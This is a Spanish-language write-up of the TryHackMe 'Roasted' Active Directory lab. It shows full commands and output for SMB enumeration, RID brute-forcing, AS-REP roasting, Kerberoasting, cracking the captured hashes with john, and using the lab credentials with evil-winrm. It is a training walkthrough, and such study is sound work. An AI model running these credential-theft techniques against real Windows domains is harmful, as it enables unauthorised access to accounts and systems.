---
title: Try Hack Me Roasted
author: k4miyo
date: 2023-06-28
math: true
mermaid: true
image:
  path: /assets/images/thm/tryhackme.png
categories: [Easy, Windows]
tags: [Windows Server, Active Directory, Enumeration, Roasting]
ping: true
---

## Máquina Roasted
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.56.12.

```bash
❯ ping -c 1 10.10.56.12
PING 10.10.56.12 (10.10.56.12) 56(84) bytes of data.
64 bytes from 10.10.56.12: icmp_seq=1 ttl=127 time=167 ms

--- 10.10.56.12 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 166.750/166.750/166.750/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.56.12 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 14:28 CST
Initiating Parallel DNS resolution of 1 host. at 14:28
Completed Parallel DNS resolution of 1 host. at 14:28, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:28
Scanning 10.10.56.12 [65535 ports]
Discovered open port 139/tcp on 10.10.56.12
Discovered open port 135/tcp on 10.10.56.12
Discovered open port 445/tcp on 10.10.56.12
Discovered open port 53/tcp on 10.10.56.12
Discovered open port 49665/tcp on 10.10.56.12
Discovered open port 49667/tcp on 10.10.56.12
Discovered open port 464/tcp on 10.10.56.12
Discovered open port 593/tcp on 10.10.56.12
Discovered open port 49670/tcp on 10.10.56.12
Discovered open port 88/tcp on 10.10.56.12
Discovered open port 5985/tcp on 10.10.56.12
Discovered open port 49669/tcp on 10.10.56.12
Discovered open port 3268/tcp on 10.10.56.12
Discovered open port 49683/tcp on 10.10.56.12
Discovered open port 389/tcp on 10.10.56.12
Discovered open port 636/tcp on 10.10.56.12
Discovered open port 3269/tcp on 10.10.56.12
Completed SYN Stealth Scan at 14:28, 26.63s elapsed (65535 total ports)
Nmap scan report for 10.10.56.12
Host is up, received user-set (0.18s latency).
Scanned at 2023-07-09 14:28:01 CST for 27s
Not shown: 65518 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.74 seconds
           Raw packets sent: 131066 (5.767MB) | Rcvd: 30 (1.320KB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.56.12
   5   │     [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,49665,49667,49669,49670,49683
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,49665,49667,49669,49670,49683 10.10.56.12 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 14:29 CST
Nmap scan report for 10.10.56.12
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-09 20:30:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2023-07-09T20:32:28
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.31 seconds
```

Vemos el puerto 445 abierto, así que vamos a tratar de acceder con una ***Null session***:

```bash
❯ smbclient -L //10.10.56.12/ -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
SMB1 disabled -- no workgroup available
```

Podríamos tratar de acceder al directorio `SYSLOG` o `NETLOGON` pero no podemos. Observamos 2 recursos:
- VulnNet-Business-Anonymous
- VulnNet-Enterprise-Anonymous

Vamos a extraer el contenido de estos directorios:

```bash
❯ smbclient //10.10.56.12/VulnNet-Business-Anonymous -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 12 20:46:40 2021
  ..                                  D        0  Fri Mar 12 20:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 19:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 19:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 19:24:34 2021

		8540159 blocks of size 4096. 4295768 blocks available
smb: \> get Business-Manager.txt
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> get Business-Sections.txt
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0.7 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> get Business-Tracking.txt
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0.2 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> exit
```

```bash
smb: \> dir
  .                                   D        0  Fri Mar 12 20:46:40 2021
  ..                                  D        0  Fri Mar 12 20:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 19:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 19:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 19:24:34 2021
g
		8540159 blocks of size 4096. 4316225 blocks available
smb: \> get Enterprise-Operations.txt
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get Enterprise-Safety.txt
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get Enterprise-Sync.txt
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit
```

```bash
❯ ll
.rw-r--r-- root root 758 B Sun Jul  9 14:41:00 2023  Business-Manager.txt
.rw-r--r-- root root 654 B Sun Jul  9 14:41:08 2023  Business-Sections.txt
.rw-r--r-- root root 471 B Sun Jul  9 14:41:13 2023  Business-Tracking.txt
.rw-r--r-- root root 467 B Sun Jul  9 14:42:16 2023  Enterprise-Operations.txt
.rw-r--r-- root root 503 B Sun Jul  9 14:42:20 2023  Enterprise-Safety.txt
.rw-r--r-- root root 496 B Sun Jul  9 14:42:25 2023  Enterprise-Sync.txt
❯ catn *
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. 
We understand that when you’ve got questions, especially when you’re on a tight proposal deadline, you NEED answers. 
Our customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.
We’re here to help, regardless of which you plan you’re on or if you’re just taking us for a test drive.
Our company looks forward to all of the business proposals, we will do our best to evaluate all of your offers properly. 
To contact our core business manager call this number: 1337 0000 7331

~VulnNet Entertainment
~TryHackMe
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Jack Goldenhand is the person you should reach to for any business unrelated proposals.
Managing proposals is a breeze with VulnNet. We save all your case studies, fees, images and team bios all in one central library.
Tag them, search them and drop them into your layout. Proposals just got... dare we say... fun?
No more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).
Your client gets a branded, interactive proposal they can sign off electronically. No need for extra software or logins.
Oh, and we tell you as soon as your client opens it.

~VulnNet Entertainment
~TryHackMe
VULNNET TRACKING
~~~~~~~~~~~~~~~~~~

Keep a pulse on your sales pipeline of your agency. We let you know your close rate,
which sections of your proposals get viewed and for how long,
and all kinds of insight into what goes into your most successful proposals so you can sell smarter.
We keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome. 
You won't miss anything ever again. 

~VulnNet Entertainment
~TryHackMe
VULNNET OPERATIONS
~~~~~~~~~~~~~~~~~~~~

We bring predictability and consistency to your process. Making it repetitive doesn’t make it boring. 
Set the direction, define roles, and rely on automation to keep reps focused and make onboarding a breeze.
Don't wait for an opportunity to knock - build the door. Contact us right now.
VulnNet Entertainment is fully commited to growth, security and improvement.
Make a right decision!

~VulnNet Entertainment
~TryHackMe
VULNNET SAFETY
~~~~~~~~~~~~~~~~

Tony Skid is a core security manager and takes care of internal infrastructure.
We keep your data safe and private. When it comes to protecting your private information...
we’ve got it locked down tighter than Alcatraz. 
We partner with TryHackMe, use 128-bit SSL encryption, and create daily backups. 
And we never, EVER disclose any data to third-parties without your permission. 
Rest easy, nothing’s getting out of here alive.

~VulnNet Entertainment
~TryHackMe
VULNNET SYNC
~~~~~~~~~~~~~~

Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.
Proposals are just one part of your agency sales process. We tie together your other software, so you can import contacts from your CRM,
auto create deals and generate invoices in your accounting software. We are regularly adding new integrations.
Say no more to desync problems.
To contact our sync manager call this number: 7331 0000 1337

~VulnNet Entertainment
~TryHackMe

```

Dentro de los recursos podemos observar varios txt cuyo contenido podemos ver posibles usuarios:
- Johnny Leet
- Tony Skid
- Jack Goldenhand
- Alexa Whitehat

Para obtener las cuentas de AD de estos usuarios, podríamos tratar de realizar un ataque de fuerza bruta sobre el servicio de SMB:

```bash
❯ cme smb 10.10.56.12 -u 'guest' -p '' --rid-brute
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  [+] Brute forcing RIDs
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.10.56.12     445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
```

Encontramos los "id" de los usuarios:
- Johnny Leet - **j-leet**
- Tony Skid - **t-skid**
- Jack Goldenhand - **j-goldenhand**
- Alexa Whitehat - **a-whitehat**

Como ya contamos con potenciales usuarios, podríamos probar un ataque de **ASReproasting**, el cual ocurre cuando una cuenta de usuario tiene el privilegio establecido ***Does not require Pre-Authentication***. Esto significa que la cuenta no necesita proporcionar una identificación válida antes de solicitar un Ticket Kerberos en la cuenta de usuario especificada. Impacket tiene una herramienta llamada **GetNPUsers.py** que nos permitirá consultar cuentas ASReproastable desde el Centro de distribución de claves (KDC). Lo único que se necesita para consultar cuentas es un conjunto válido de nombres de usuario, las cuales ya contamos:

```bash
❯ impacket-GetNPUsers vulnnet-rst.local/ -request -outputfile kerberos-users -usersfile userlist -no-pass -dc-ip 10.10.91.90
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Vemos que tres usuarios de los cuatro no tienen **DONT_REQUIRE_PREAUTH**, lo que indica que un usuarios si tiene el permiso y es `t-skid`, cuyo ticket de Kerberos ya lo tenemos en nuestro archivo de salida `kerberos-users`; por lo tanto vamos a tratar de crackear el ticket ***Kerberos 5 AS-REP type 23*** y obtener la contraseña:

```bash
❯ catn kerberos-users
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:d31aaaf055a84b0fe55ebfd699847702$b66b26c00d834ba37c603c3536876c8562177e85a7955130915a938db0bcec53479e12c1c91b8002878275304115b2c9cfcd033abdc0e1384d959b75e75469d3e4e5e21570a223a86d5a9979836b0a0a54647c514352b8b7495c105dce269681ff915689326e92f3db7c0292908b60e22017e7ac328c7fdd86ded30c6490fdcb3d4fe7cac0be904acfa9dfcec3fb5e2303d3b45467f930ad4063126cee1cfdc505e7539a37c64c0cab83b420f9415b75c53c7a93b2bb1788d87ea513371dc6342b8e881a18d26d18362fd6ec291829268eec2e8c1aee3fc333ffccfa6e3e8acc3b72b3d05f0c445ce16485c067bb8aea36d365d24c97
```

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
1g 0:00:00:01 DONE (2023-07-09 16:03) 0.6849g/s 2177Kp/s 2177Kc/s 2177KC/s tk072155167..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ya contramos con las credenciales del usuario `t-skid : tj072889*`; por lo tanto vamos a ver a que otros recursos podemos acceder por SMB.

```bash
❯ cme smb 10.10.91.90 -u 't-skid' -p 'tj072889*' --shares
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\t-skid:tj072889* 
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  [+] Enumerated shares
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share 
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.10.91.90     445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```

Vamos a tratar de acceder al recurso `NETLOGON` por si encontramos algo interesante.

```bash
❯ smbclient //10.10.91.90/NETLOGON -U 'vulnnet-rst.local\t-skid'
Password for [VULNNET-RST.LOCAL\t-skid]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Mar 16 17:15:49 2021
  ..                                  D        0  Tue Mar 16 17:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 17:18:14 2021

		8540159 blocks of size 4096. 4319400 blocks available
smb: \>
```

Vemos un script VBS, así que vamos a descargarlo a nuestra máquina de atacante para ver su contenido.

```bash
smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \> exit
```

```vb
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTName
```

Tenemos la contraseña del usuario `a-whitehat`, vamos a validarlas.

```bash
❯ cme smb 10.10.231.139 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' --shares
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  [+] Enumerated shares
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  C$              READ,WRITE      Default share
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```

Tenemos un `Pwn3d!`, lo que significa que podemos acceder a la máquina con dicho usuario utilizando `evil-winrm`:

```bash

```

Otra forma de acceder a la máquina, servía que a partir del usuario `t-skid`, podríamos tratar buscar nombres principales de servicio (SPN) compatibles y obtener un TGS para el SPN usando la herramienta ***GetUserSPNs*** de Impacket. Este ataque es conocido como ***Kerberoasting***.

```bash
❯ impacket-GetUserSPNs vulnnet-rst.local/t-skid:tj072889\* -dc-ip 10.10.231.139 -request
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 13:45:09.913979  2021-03-13 17:41:17.987528             



$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$0c6ab95158bf703cea87e6d548ab4fdb$f2d028487aefca80c762f0c7eff7da1d889ae98acc7c5c58612db599929ba04328237715e6f649554a58793b8d1eb3b556eb72f9e07867dc00787f91ba15bb243938b087df3310459f3a2844bca6e8034228297bffe7826969312b0eee648fcc6797f7df0b283b2e3c3576c073e9e8a7fb7ed0bdec4412f095c4b509a23ca1dacf7af2512419a33c31099d10408a4aa79097515e8772dc85d8b9b953f9a74a4d5ee8bd7f7095bebc9877951760fc8f92c8c484427268ee95c51a50db8dae20b6a6c8c4f1dcc056d94245686bd11a7e9ddca12ee43d302edacc20100ec064d6f45a128f34343028c305fd44533912a07145739ca875176f21bd13882f2b8577f0e6babeeb7dc9ac7c113c917a16e2d57da1914d2e832958cbbc50ca3be7916f6486efeab9ef9d6def2d50b55e6f24d32f02c3e09c129795d762e2deae95ec75e1c2eb326d870d09c830bcbc165b94fd235283beb2ed5d5f6f670e9f80fb9c3bfb51083c8357423ed402667da9901124409c545da3ba6288edd413d4aab94f5d56d04fd903426b7c59126d35464d55d6e3abe85fc59bbcc9ba57b2fc131ed8d354b08a1e1b6fe667a8a332abd88054fb4ad3560ecb079f53d529b202fcb17adc9890d115228cf4438cef054beb07f681990a22d5f7d2f10cc4f39834f4a220f3e1d8922958c91d4430ec994910ff33f586e8deb5c0e000cdf25443f9fd2eca89435b621b6bd95979aed87ba7a8ce1015beb25446648a03845e342a3aa4adac7a8223e186ff852354be10ecdd22e5b420819dfe7093cc68212b9f1e47289bab2849ae586024524a83e454dbb8eeb2d85943cbb3bca5356cfb1d2d19e2650de24d8a41c73888fc5c84b1a0c1d9bb6fc1a9dfd4cffea9d8ad81c37874ba81275b614ba8ef7338b8bc1806c23aeffaa9183870df9f8fc615fc27762239882021cca40e1608e3aced2e7d102d926a42580fd8d0eea5580eb0ff63ad2cb04b8fd86692c3ae58af7c5d6d0f263f2f0d4e20a5c059206967ac1a2b3fb8ef63aeee8c52e58807b735dd5b43de0fd1cd1872255bfa4fb542b1701aef2f6a00550dbe9c5c6f5ceb880cdfcea5f7b49e1b96f1c6499f6bca152a0cefdccdbe4e6a8f6b88e3ed8326d115c17fc1fccff17109e8f6ad6e721c06225660010e31d7243f463a16e0bd9017c2ea495f59f7421e85c01a93674c5f4b6e7ccc141cca746f4b32504170c419005f6318753b5401ec407550f48253c720a2c595b1eca61e0a6191599e14566af1c9ca2aed1c6d85b2c70da31d2ed9d131c9e41e38d482ca5125ec78d7de145af0b7a0743dde699b2c164ce2fd0396848cf47ab16b28a8fe921c8a25c88210ce99e4bbf72c22e4eb108c825a17fbfd814563244249c543333cef64b6
```

Tenemos el ticket del usuario `enterprise-core-vn`, así que vamos a tratar de crackearlo:

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)
1g 0:00:00:01 DONE (2023-07-09 17:39) 0.7299g/s 2998Kp/s 2998Kc/s 2998KC/s ryannamber..ry=iIyD{N
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ya tenemos las credenciales y podemos acceder a la máquina como el usuario `enterprise-core-vn` o como el usuario `a-whitehat`:

```bash
❯ evil-winrm -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' -i 10.10.231.139 -N
                                        
